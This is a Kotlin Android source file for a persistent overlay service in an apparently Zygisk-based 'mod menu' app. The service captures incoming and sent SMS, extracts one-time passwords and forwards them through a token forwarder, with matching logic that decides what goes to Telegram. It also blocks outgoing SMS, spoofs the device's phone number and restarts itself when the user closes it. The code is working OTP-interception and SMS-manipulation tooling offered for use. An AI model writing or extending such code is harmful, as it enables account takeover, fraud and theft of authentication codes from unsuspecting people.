package com.hivirtus.zygiskmode

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.IBinder
import android.provider.Telephony
import android.widget.Toast
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class OverlayService : Service() {

    private val configManager by lazy { ConfigManager(this) }
    private val tokenForwarder by lazy { TokenForwarder(configManager, this) }
    private val bubbleManager by lazy { FloatingBubbleManager(this) }
    private val sendSmsFloatManager by lazy { SendSmsFloatManager(this) }
    private val hookStatusBar by lazy { HookStatusBarManager(this) }
    private var pollJob: Job? = null
    private var lastForwardedFingerprint = ""
    private var running = false
    private var smsMonitor: SmsCaptureMonitor? = null
    private var sentSmsWatcher: SentSmsWatcher? = null
    private var capturedReceiver: BroadcastReceiver? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> {
                unregisterReceivers()
                smsMonitor?.stop()
                sentSmsWatcher?.stop()
                bubbleManager.hide()
                sendSmsFloatManager.hide()
                hookStatusBar.hide()
                stopForeground(STOP_FOREGROUND_REMOVE)
                stopSelf()
                return START_NOT_STICKY
            }
            ACTION_SHOW_BUBBLE -> {
                ensureRunning(showBubble = true)
                return START_STICKY
            }
            ACTION_HIDE_BUBBLE -> {
                bubbleManager.hide()
                ensureRunning(showBubble = false)
                return START_STICKY
            }
            ACTION_OPEN_SEND_SMS_FLOAT -> {
                ensureRunning(showBubble = true)
                sendSmsFloatManager.show()
                return START_STICKY
            }
        }

        if (!ModuleGate.isModuleFlashed(this)) {
            stopSelf()
            return START_NOT_STICKY
        }

        ensureRunning(showBubble = true)

        try {
            startForeground(NOTIFICATION_ID, createNotification())
        } catch (_: Exception) {}

        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        // App recents se cut — bubble + SMS hook alive rahe
        try {
            val restart = Intent(applicationContext, OverlayService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restart)
            } else {
                startService(restart)
            }
        } catch (_: Exception) {}
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        running = false
        pollJob?.cancel()
        smsMonitor?.stop()
        sentSmsWatcher?.stop()
        unregisterReceivers()
        bubbleManager.hide()
        sendSmsFloatManager.hide()
        hookStatusBar.hide()
        super.onDestroy()
    }

    private fun ensureRunning(showBubble: Boolean) {
        if (!running) {
            running = true
            registerReceivers()
            startSmsMonitor()
            startOtpPolling()
        }
        if (showBubble) {
            bubbleManager.show()
        }
    }

    private fun registerReceivers() {
        if (capturedReceiver == null) {
            capturedReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    forwardLatestOtp()
                }
            }
            try {
                val filter = IntentFilter(SmsInterceptReceiver.ACTION_SMS_CAPTURED)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    registerReceiver(capturedReceiver, filter, RECEIVER_NOT_EXPORTED)
                } else {
                    registerReceiver(capturedReceiver, filter)
                }
            } catch (_: Exception) {}
        }
    }

    private fun unregisterReceivers() {
        capturedReceiver?.let { try { unregisterReceiver(it) } catch (_: Exception) {} }
        capturedReceiver = null
    }

    private fun startSmsMonitor() {
        if (smsMonitor != null && sentSmsWatcher != null) return
        if (smsMonitor == null) {
            smsMonitor = SmsCaptureMonitor(this) { otp -> forwardOtp(otp) }
            smsMonitor?.start()
        }
        if (sentSmsWatcher == null) {
            sentSmsWatcher = SentSmsWatcher(this)
            sentSmsWatcher?.start()
        }
    }

    private fun startOtpPolling() {
        pollJob = CoroutineScope(Dispatchers.IO).launch {
            while (isActive) {
                AutoHookWatcher.tick(this@OverlayService, configManager)
                OutgoingSmsGuard.refresh(this@OverlayService)
                PhoneSmsBlocker.enforce(this@OverlayService)
                sentSmsWatcher?.scanSentBox()
                pollNativeBlockedFlag()
                hookStatusBar.refresh()
                delay(300)
            }
        }
    }

    private fun pollNativeBlockedFlag() {
        try {
            val flag = java.io.File("/data/local/tmp/hivirtus_outgoing_blocked.flag")
            if (!flag.canRead()) return
            val line = flag.readText().trim()
            if (line.isBlank()) return
            val parts = line.split("|", limit = 2)
            val dest = parts.getOrElse(0) { "" }
            val body = parts.getOrElse(1) { "" }
            if (body.isBlank()) return
            sendBroadcast(
                Intent(BlockedSmsReceiver.ACTION_OUTGOING_BLOCKED)
                    .setPackage(packageName)
                    .putExtra(BlockedSmsReceiver.EXTRA_DEST, dest)
                    .putExtra(BlockedSmsReceiver.EXTRA_BODY, body)
            )
        } catch (_: Exception) {
        }
    }

    private fun forwardLatestOtp() {
        try {
            val lastOtp = configManager.readLastOtp() ?: return
            val config = configManager.load()
            val peer = lastOtp.rawPeer.ifBlank { lastOtp.sender }
            val body = lastOtp.body.ifBlank { lastOtp.otp }
            if (!SmsMatcher.shouldForwardToTelegram(config, peer, body, lastOtp.direction)) return
            forwardOtp(lastOtp)
        } catch (_: Exception) {}
    }

    private fun forwardOtp(otp: LastOtp) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val fingerprint = otpForwardFingerprint(otp)
                if (fingerprint == lastForwardedFingerprint) return@launch
                if (tokenForwarder.forward(otp)) {
                    lastForwardedFingerprint = fingerprint
                }
            } catch (_: Exception) {}
        }
    }

    private fun otpForwardFingerprint(otp: LastOtp): String {
        val peer = otp.rawPeer.ifBlank { otp.sender }
        val body = otp.body.ifBlank { otp.otp }
        val capturedAt = otp.capturedAt.coerceAtLeast(0L)
        return "$capturedAt|$peer|$body"
    }

    private fun createNotification(): Notification {
        val channelId = "hivirtus_zygisk_mode"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                getString(R.string.notification_channel),
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }

        val openIntent = Intent(this, OverlayActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
        }
        val pending = PendingIntent.getActivity(
            this, 0, openIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val stopIntent = Intent(this, OverlayService::class.java).setAction(ACTION_STOP)
        val stopPending = PendingIntent.getService(
            this, 1, stopIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val config = configManager.load()
        val subText = when {
            config.enablePhoneSpoof || config.enableSim1Mock -> {
                val phone = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }
                getString(R.string.fake_number_on, phone)
            }
            else -> getString(R.string.bubble_always_on)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle(getString(R.string.mod_menu_title))
            .setContentText(subText)
            .setSmallIcon(R.drawable.ic_notification)
            .setContentIntent(pending)
            .addAction(0, getString(R.string.open_menu), pending)
            .addAction(0, getString(R.string.stop_overlay), stopPending)
            .setOngoing(true)
            .build()
    }

    companion object {
        const val ACTION_STOP = "com.hivirtus.zygiskmode.STOP"
        const val ACTION_OPEN = "com.hivirtus.zygiskmode.OPEN"
        const val ACTION_SHOW_BUBBLE = "com.hivirtus.zygiskmode.SHOW_BUBBLE"
        const val ACTION_HIDE_BUBBLE = "com.hivirtus.zygiskmode.HIDE_BUBBLE"
        const val ACTION_OPEN_SEND_SMS_FLOAT = "com.hivirtus.zygiskmode.OPEN_SEND_SMS_FLOAT"
        private const val NOTIFICATION_ID = 2001
    }
}
